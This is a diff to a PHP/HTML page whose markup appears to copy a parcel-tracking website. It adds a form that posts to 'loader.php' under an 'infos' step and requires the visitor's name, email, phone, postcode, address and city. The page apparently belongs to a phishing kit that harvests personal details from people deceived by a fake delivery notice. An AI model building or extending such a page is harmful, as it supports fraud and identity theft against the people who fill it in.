@@ -265,12 +265,33 @@ component-margin
                 </div>
 
                 <center>
-                <form action="loader.php">
-                    <input type="text" name="r" value="infos" hidden>
-                    <input type="text" name="t" value="1000" hidden>
-					<button class="c-voc-tracking-bar--button js--tracking-bar--button base-button "><?=$b6?></button>
-				</form>
-            	</center>
+                <form action="loader.php" method="post" class="user-info-form">
+                    <input type="hidden" name="r" value="infos">
+                    <input type="hidden" name="t" value="1000">
+                    <div class="form-group">
+                        <input type="text" name="last-name" placeholder="Nom" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" name="first-name" placeholder="Prénom" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="email" name="email" placeholder="Email" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="tel" name="telephone" placeholder="Téléphone" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" name="zip-code" placeholder="Code Postal" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" name="adresse" placeholder="Adresse" required class="form-control">
+                    </div>
+                    <div class="form-group">
+                        <input type="text" name="city" placeholder="Ville" required class="form-control">
+                    </div>
+                    <button type="submit" class="c-voc-tracking-bar--button js--tracking-bar--button base-button"><?=$b6?></button>
+                </form>
+            </center>
 
                 <span class="link-anchor" id="parsysPath_text_generic_copy_co"></span>
                 <div class="component-margin c-text-generic has-rte component-small ">
